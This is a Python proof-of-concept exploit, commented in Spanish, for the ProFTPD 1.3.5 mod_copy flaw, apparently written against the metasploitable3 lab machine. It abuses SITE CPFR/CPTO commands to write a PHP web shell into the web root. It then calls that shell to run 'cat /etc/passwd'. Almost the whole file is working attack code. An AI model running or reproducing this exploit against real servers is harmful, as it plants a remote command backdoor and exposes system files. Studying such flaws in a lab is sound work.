# Creación del exploit para PROFTPD 1.3.5

import socket
import requests

class Exploit: # Exploit class for PROFTPD 1.3.5
    def __init__(self, target_ip, target_port, path):
        self.target_ip = target_ip
        self.target_port = target_port
        self.path = path # Donde se va a escribir el fichero que seleccionemos del servidor.
        self.sock = None

        '''
        El objetivo principal de esta vulnerabilidad es crear un fichero con un código específico, colocarlo en una ruta específica y ejecutarlo.
        Para esto, se usará código PHP. El código PHP se pondrá en el servidor y desde la URL se va a ejecutar cada comando introducido cuando 
        se mande la petición de respuesta al servidor.

        Antes de hablar del procedimiento, hay que mencionar que cada proceso tiene un ID y en Linux, dentro de `/proc` (que es un directorio con 
        información de cada proceso en ejecución) hay un fichero llamado `cmdline` que si se llama de la siguiente forma: 

        `cat /proc/5439/cmdline` → siendo `5439` el número del proceso

        Nos va a arrojar el texto que se utilizó para inicializar ese proceso.

        Ya habiendo hablado de lo anterior, el procedimiento en cuestión es nombrar a un archivo como el código que se quiera usar y usar `cmdline` 
        para guardarlo en cualquier ubicación y ejecutarlo.

        La ubicación del archivo, en este ejemplo usando la máquina vulnerable metasploitable3 es:
        http://192.168.146.139/index.html

        Dicha ubicación es la que muestra la máquina metasploitable3 porque expone un servidor web.
        Por esta razón, vamos a seleccionar un archivo del servidor FTP y lo vamos a mover al index
        así accedemos a él vía web.

        En este POC, vamos a seleccionar el archivo /etc/passwd del servidor FTP y lo vamos a mostrar en la CLI.
        '''
    
    def connect(self): # Se va a encargar de conectar con el servidor FTP vulnerable
        try:
            self.sock = socket.create_connection((self.target_ip, self.target_port))
            print(f"[+] Conectado a {self.target_ip}:{self.target_port}")
        except Exception as e:
            print(f"[-] No se pudo conectar a {self.target_ip}:{self.target_port} - {e}")
            return False
        return True

    '''
    Una vez conectados al servidor FTP vulnerable, vamos a enviarle los comandos necesarios para
    mover el archivo seleccionado a la ubicación que queramos.
    '''

    def send_command(self, command):
        try:
            self.sock.sendall(command.encode('utf-8') + b'\r\n')
            response = self.sock.recv(4096).decode('utf-8')
            print(f"[+] Comando enviado: {command.strip()}")
            return response
        except Exception as e:
            print(f"[-] Error al enviar comando {command} - {e}")
            return None
    
    '''
    Se va a crear la explotación en sí.
    '''

    def exploit(self):
        # Código PHP para crear la ejecución remota de código
        php_payload = "<?php echo passthru($_GET['cmd']); ?>"
        
        # Escritura del payload PHP en el archivo 
        self.send_command(f"SITE CPFR /proc/self/cmdline\n") # Selección del archivo a copiar
        self.send_command(f"SITE CPTO /tmp/.{php_payload}\n") # Destino temporal del archivo cuyo nombre es el payload PHP
        self.send_command(f"SITE CPFR /tmp/.{php_payload}\n") # Selección del archivo temporal
        respuesta = self.send_command(f"SITE CPTO {self.path}\n") # Destino final del archivo con el nombre elegido

        # Validación de la acción
        if respuesta:
            print(f"[+] Archivo movido exitosamente a {self.path}")
        else:
            print(f"[-] Fallo al mover el archivo a {self.path} debido a: {respuesta}")
    
    '''
    Por último, se va a ejecutar todo el proceso.
    '''

    def trigger(self):
        try:
            response = requests.get(f"http://{self.target_ip}/backdoor.php?cmd=cat /etc/passwd")
            if response.status_code == 200:
                print("[+] Código PHP ejecutado exitosamente. Respuesta:")
                print(response.text)
            else:
                print(f"[-] Fallo al ejecutar el código PHP. Código de estado: {response.status_code}")
        except Exception as e:
            print(f"[-] Error al realizar la solicitud HTTP - {e}")
    
    def run(self):
        if self.connect():
            self.exploit()
            self.sock.close()
            print("[+] Conexión cerrada.")